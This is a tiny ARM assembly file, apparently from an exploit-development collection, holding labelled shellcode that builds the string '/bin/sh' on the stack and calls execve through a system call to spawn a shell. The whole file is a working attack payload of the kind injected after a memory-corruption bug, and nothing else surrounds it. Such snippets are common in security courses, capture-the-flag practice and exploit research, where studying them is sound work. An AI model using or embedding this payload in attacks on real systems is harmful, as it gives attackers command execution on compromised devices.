#
# ARM sys_exec("/bin/sh") shellcode
#
# @_hugsy_
#
ldr r0, =0x6e69622f
str r0, [sp]
ldr r0, =0x0068732f
str r0, [sp, 4]
mov r0, sp
mov r1, 0
mov r2, 0
mov r7, 11
svc 0
